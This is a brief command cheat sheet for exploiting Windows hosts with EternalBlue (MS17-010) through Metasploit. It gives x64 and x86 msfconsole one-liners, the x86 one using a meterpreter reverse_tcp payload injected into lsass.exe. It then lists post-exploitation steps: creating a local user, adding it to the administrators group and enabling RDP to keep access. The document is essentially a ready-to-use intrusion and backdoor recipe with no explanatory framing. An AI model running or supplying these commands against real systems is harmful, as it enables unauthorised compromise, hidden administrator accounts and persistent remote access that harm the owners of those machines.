```bash 
x64
$ msfconsole -x 'use windows/smb/ms17_010_eternalblue;set RHOST x.x.x.x;SET LPORT 10032;exploit'
x32
# msfconsole -x 'use exploit/windows/smb/eternalblue_doublepulsar;set DOUBLEPULSARPATH /usr/share/metasploit-framework/modules/exploits/windows/smb/deps;set ETERNALBLUEPATH /usr/share/metasploit-framework/modules/exploits/windows/smb/deps;set PROCESSINJECT lsass.exe;set TARGETARCHITECTURE x86;set RHOST x.x.x.x;set LPORT 10031;set payload windows/meterpreter/reverse_tcp;exploit'
```


`C:\Users\Administrator> chcp 65001`

`C:\Users\Administrator> net user hhh pppp /add`

`C:\Users\Administrator> net localgroup administrators hhh /add`

`C:\Users\Administrator> exit`

`meterpreter > bg`

`MSF> use post/windows/manage/enable_rdp`

`MSF> set SESSION 1`

`MSF> run`

 